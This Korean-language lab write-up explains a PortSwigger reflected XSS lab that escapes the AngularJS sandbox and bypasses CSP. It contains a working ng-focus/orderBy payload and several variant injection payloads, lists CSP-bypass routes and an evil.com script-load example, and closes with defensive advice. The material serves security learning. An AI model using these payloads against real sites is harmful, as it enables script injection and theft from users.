# Lab: Reflected XSS with AngularJS sandbox escape and CSP

## 개요

- **난이도**: Expert
- **주제**: Cross-Site Scripting (XSS) — Client-Side Template Injection / AngularJS 샌드박스 탈출 + CSP 우회
- **링크**: https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp

## 목표

Content Security Policy(CSP)로 인라인 스크립트와 이벤트 핸들러가 차단된 상황에서, Angular의 `ng-focus` 디렉티브 + URL fragment `#` + `$event.composedPath()` + `orderBy` 필터를 조합해 `window.alert` 을 실행시킨다.

## 제약 조건

```
CSP 차단:
  <script>alert(1)</script>      — 인라인 스크립트 차단
  <img onerror="alert(1)">       — 인라인 이벤트 핸들러 차단
  <div onfocus="alert(1)">       — 인라인 이벤트 핸들러 차단
  eval(), new Function()         — unsafe-eval 차단

CSP 허용:
  Angular 라이브러리 로드          — 허용된 CDN/도메인
  ng-focus, ng-click 등 Angular 디렉티브 — Angular 자체 코드가 실행하므로 허용
```

## 최종 페이로드

```
/?search=<input id=x ng-focus=$event.composedPath()|orderBy:'x=alert(1)'>#x
```

## 핵심 원리 — 왜 CSP가 `ng-focus` 를 막지 못하는가

```
브라우저의 CSP 관점:
  <div onfocus="alert(1)">  → "인라인 이벤트 핸들러" → 차단
  <div ng-focus="...">      → "알 수 없는 속성" → 차단 대상 아님

Angular 관점:
  <div ng-focus="...">  → Angular JS가 직접 읽고 평가
  → Angular 라이브러리 자체는 CSP가 허용한 외부 스크립트
  → Angular 내부에서 ng-focus 값을 $parse 로 실행
  → 브라우저가 직접 실행하는 것이 아님 → CSP 우회

핵심:
  CSP는 브라우저가 직접 실행하는 인라인 코드를 막는다.
  ng-* 속성은 Angular 라이브러리(허용된 외부 JS)가 읽고 실행한다.
  → 브라우저 입장에서는 "Angular 라이브러리가 속성을 읽는 것" 이므로 CSP 검사 대상이 아님.
```

## 단계별 분해 분석

### 1단계: `<input id=x ng-focus=...>` + `#x` — 사용자 상호작용 없는 포커스 발동

```html
<!-- 주입된 HTML -->
<input id=x ng-focus=$event.composedPath()|orderBy:'x=alert(1)'>

<!-- URL 끝의 fragment -->
#x
```

```
URL fragment(#x) 동작:
  브라우저가 페이지 로드 후 id="x" 인 요소를 자동으로 포커스
  → input 요소이므로 포커스 가능
  → ng-focus 이벤트 발화 (사용자 클릭/탭 필요 없음)
```

**왜 `<input>` 인가**: `<div>`, `<span>` 은 기본적으로 포커스 불가. `<input>` 은 기본적으로 포커스 가능한 요소이므로 `#id` 만으로 자동 포커스 발동.

---

### 2단계: `$event.composedPath()` — 이벤트 경로 배열 획득

`$event` 는 Angular 템플릿에서 현재 DOM 이벤트 객체를 가리킨다.

```javascript
// focus 이벤트가 발생했을 때 $event.composedPath() 반환값:
[
  input#x,           // 이벤트 발생 요소 (가장 안쪽)
  body,              // 부모 요소들...
  html,
  document,
  Window             // 최상위 (가장 바깥쪽)
]
```

**composedPath() 란**:
- DOM 이벤트가 버블링되는 경로의 모든 노드를 배열로 반환
- 가장 안쪽 요소(이벤트 타겟)부터 `Window` 까지 포함
- Shadow DOM 내부 요소도 포함 (composed = 합성)

```javascript
// 일반 path() vs composedPath()
event.path          // 비표준, 일부 브라우저만 지원
event.composedPath() // 표준, Shadow DOM 포함한 전체 경로
```

---

### 3단계: `|orderBy` — Angular 파이프와 필터

```
$event.composedPath() | orderBy:'x=alert(1)'
         ↑                    ↑
      배열 입력         필터 이름과 표현식
```

**Angular의 `|` (파이프) 연산자**:

```
[배열] | [필터이름]:[인자]

예:
  [3,1,2] | orderBy                    → 정렬된 배열
  ['b','a'] | orderBy:'length'         → 길이순 정렬
  composedPath 배열 | orderBy:'x=...'  → 표현식을 각 요소에 적용해 정렬
```

**`orderBy` 가 표현식을 실행하는 방식**:

```javascript
// orderBy 내부 동작 (개념적)
function orderBy(array, expression) {
    var predicate = $parse(expression);  // 문자열 → 함수로 컴파일
    return array.sort((a, b) => {
        var keyA = predicate(a);  // 각 배열 요소를 인자로 표현식 실행
        var keyB = predicate(b);
        return keyA > keyB ? 1 : -1;
    });
}
```

---

### 4단계: `Window` 객체 컨텍스트에서 `alert` 실행

```javascript
// orderBy 가 배열의 각 요소에 대해 'x=alert(1)' 실행
predicate(input#x)   // input 객체 컨텍스트에서 x=alert(1) → alert 미존재
predicate(body)      // body 컨텍스트에서 x=alert(1) → alert 미존재
predicate(document)  // document 컨텍스트에서 x=alert(1) → alert 미존재
predicate(Window)    // Window 컨텍스트에서 x=alert(1)
                     //   → Window.alert 이 존재!
                     //   → alert(1) 실행!
```

**왜 `Window` 컨텍스트에서만 동작하는가**:

```javascript
// $parse 는 표현식을 scope 컨텍스트에서 실행
// orderBy 는 배열의 각 요소를 scope 로 사용해 predicate 호출

// Window 객체를 scope 로 사용하면:
// alert → Window.alert → 존재함
// x = alert(1) → window.alert(1) 호출 → XSS 성공!
```

---

### 전체 실행 흐름

```
1. URL 파라미터: ?search=<input id=x ng-focus=...>
   → 서버가 HTML에 <input id=x ng-focus=...> 삽입

2. URL fragment: #x
   → 브라우저가 페이지 로드 후 id="x" 요소 자동 포커스
   → ng-focus 이벤트 발화

3. Angular가 ng-focus 표현식 평가:
   $event.composedPath()|orderBy:'x=alert(1)'

4. $event.composedPath():
   → [input#x, body, html, document, Window] 반환

5. |orderBy:'x=alert(1)':
   → 배열의 각 요소를 컨텍스트로 'x=alert(1)' 표현식 실행
   → Window 차례일 때 alert(1) 호출 성공!
```

## 이전 랩들과의 비교

| 항목 | 011 랩 | 025 랩 | 026 랩 (이번) |
|------|--------|--------|--------------|
| 차단 요소 | — | 문자열 리터럴 | CSP (인라인 스크립트) |
| 이벤트 트리거 | `{{}}` 직접 | URL 파라미터 | `ng-focus` + `#fragment` |
| 문자열 우회 | 직접 사용 | `fromCharCode` | 직접 사용 가능 |
| alert 접근 | `constructor.constructor('alert(1)')()` | `orderBy` + fromCharCode | `composedPath` → Window |
| CSP 우회 | 불가 | 불가 | `ng-*` 디렉티브 사용 |
| 난이도 | Practitioner | Expert | Expert |

## 핵심 정리

- CSP는 브라우저가 직접 실행하는 인라인 스크립트/핸들러를 막지만, Angular 디렉티브(`ng-*`)는 허용된 Angular 라이브러리가 실행하므로 차단되지 않는다.
- URL fragment `#id` 는 해당 요소를 자동 포커스시키므로 사용자 상호작용 없이 `ng-focus` 를 발동할 수 있다.
- `$event.composedPath()` 는 이벤트 경로의 모든 DOM 노드 배열(최상위에 `Window` 포함)을 반환한다.
- `orderBy` 필터는 배열의 각 요소를 컨텍스트로 표현식을 실행하므로, `Window` 가 컨텍스트가 될 때 `alert` 에 접근 가능하다.
- **방어**:
  - Angular 2+ 사용 (구조적으로 이 취약점 없음)
  - CSP에 `require-trusted-types-for 'script'` 추가
  - Angular 1.x 사용 불가피 시: 사용자 입력을 절대 Angular 표현식 컨텍스트에 삽입하지 않음

## 배운 점 및 추가 학습

### 1. CSP (Content Security Policy) 동작 원리

```
CSP 헤더 예:
Content-Security-Policy: script-src 'self' https://ajax.googleapis.com; default-src 'self'

차단 대상:
  <script>alert(1)</script>               — 인라인 스크립트
  <img onerror="alert(1)">               — 인라인 이벤트 핸들러
  <script src="https://evil.com/x.js">   — 허용 안 된 외부 스크립트
  eval("alert(1)")                       — unsafe-eval 없으면 차단

허용 대상:
  <script src="https://ajax.googleapis.com/angular.js"> — 허용 도메인
  Angular 내부에서 ng-* 속성 평가           — 허용된 Angular 가 실행
```

```
CSP 우회 가능한 상황:
  1. Angular, jQuery 등 표현식 평가 라이브러리가 허용된 경우 → ng-* 등 디렉티브 공격
  2. JSONP 엔드포인트가 허용 도메인에 있는 경우 → 콜백으로 코드 실행
  3. 허용 도메인에 업로드 기능이 있는 경우 → JS 파일 업로드 후 로드
  4. base-uri 미설정 시 → <base> 태그로 상대 경로 변조
```

### 2. `composedPath()` vs `path` vs `target`

```javascript
// focus 이벤트 발생 시 각 속성 비교
event.target           // → input#x (이벤트 발생 요소)
event.currentTarget    // → 현재 핸들러가 등록된 요소
event.path             // → 비표준, Chrome 구버전
event.composedPath()   // → [input#x, ..., Window] (표준, Shadow DOM 포함)

// composedPath 가 이번 공격에 유리한 이유:
// 배열 마지막에 항상 Window 가 포함됨
// → orderBy 가 Window 컨텍스트로 표현식 실행 가능
```

### 3. Angular 파이프(`|`) 완전 이해

```
Angular 표현식에서 | 의 의미:

값 | 필터이름           → 필터 적용
값 | 필터이름:인자      → 인자와 함께 필터 적용
값 | 필터1 | 필터2      → 여러 필터 체인

내장 필터 목록:
  currency    — 통화 형식
  date        — 날짜 형식
  filter      — 배열 필터링
  json        — JSON 직렬화
  limitTo     — 배열/문자열 길이 제한
  lowercase   — 소문자 변환
  number      — 숫자 형식
  orderBy     — 배열 정렬 ← XSS 악용 가능
  uppercase   — 대문자 변환

XSS 악용 가능한 필터:
  orderBy — 인자를 $parse 로 표현식 평가
  filter  — 필터 함수로 표현식 평가
```

### 4. `ng-*` 디렉티브와 CSP 우회 가능 조합

```html
<!-- 포커스 기반 (이번 랩) -->
<input id=x ng-focus=$event.composedPath()|orderBy:'...'>#x

<!-- 클릭 기반 (사용자 상호작용 필요) -->
<button ng-click=$event.composedPath()|orderBy:'alert(1)'>클릭</button>

<!-- 마우스오버 기반 -->
<div ng-mouseover=$event.composedPath()|orderBy:'alert(1)'>

<!-- 로드 즉시 (ng-init) -->
<div ng-app ng-init="constructor.constructor('alert(1)')()">
     <!-- ng-init은 Angular 앱 초기화 시 즉시 실행 -->

<!-- 반복문 악용 -->
<div ng-repeat="x in [1]|orderBy:'alert(1)'">
```

### 5. URL fragment(`#`)의 보안적 의미

```
https://example.com/page?search=...#targetId
                                    ↑
                                    fragment

특성:
  1. fragment 는 서버로 전송되지 않음 (클라이언트 전용)
  2. 브라우저는 fragment 에 해당하는 id 를 가진 요소를 자동 스크롤/포커스
  3. 서버 로그에 기록되지 않아 탐지 회피에 유리

XSS에서의 활용:
  #x → id=x 인 요소 자동 포커스
  → ng-focus 자동 발동 → 사용자 상호작용 불필요
  → autofocus 속성과 동일 효과, 더 범용적
```

### 6. CSP + Angular 환경 방어 전략

```
취약한 구성:
  ✗ Angular 1.x 사용
  ✗ 사용자 입력이 ng-* 속성값에 반영
  ✗ CSP에 Angular CDN 허용 (예: ajax.googleapis.com)

올바른 방어:
  1. Angular 2+ 로 마이그레이션
     → ng-* 디렉티브가 샌드박스 없이 안전하게 설계됨
     → AOT 컴파일로 런타임 표현식 평가 최소화

  2. Angular 1.x 불가피 시: ngCsp 모듈 활성화
     <html ng-app ng-csp>
     → Angular 가 eval() 대신 안전한 파서 사용
     → 단, 완전한 방어는 아님

  3. 사용자 입력을 서버에서 완전 이스케이프 후 삽입
     → Angular 표현식 특수문자 {{ }} $ | 등 모두 인코딩

  4. strict-dynamic CSP 사용
     Content-Security-Policy: script-src 'nonce-RANDOM' 'strict-dynamic'
     → Angular 포함 모든 스크립트에 nonce 필요
     → CDN 도메인 화이트리스트 방식보다 훨씬 강력
```

### 7. `window.alert` 이 실행되는 원리 (깊은 이해)

```javascript
// Angular $parse 가 표현식을 scope 컨텍스트에서 실행하는 방식

// 일반적인 Angular scope 에서:
$parse('alert(1)')($scope)
// → $scope.alert 를 찾음 → undefined → 실행 불가

// Window 를 scope 로 사용할 때:
$parse('alert(1)')(window)
// → window.alert 를 찾음 → 존재! → alert(1) 실행

// orderBy 가 composedPath 배열을 처리할 때:
// predicate(Window) 호출 시
// → 'x=alert(1)' 표현식을 Window 컨텍스트에서 실행
// → Window.x = Window.alert(1)
// → alert(1) 호출!

// 핵심: $parse 는 전달받은 객체를 scope 로 사용해 속성을 조회
// Window 를 scope 로 받으면 전역 함수(alert, fetch 등)에 접근 가능
```
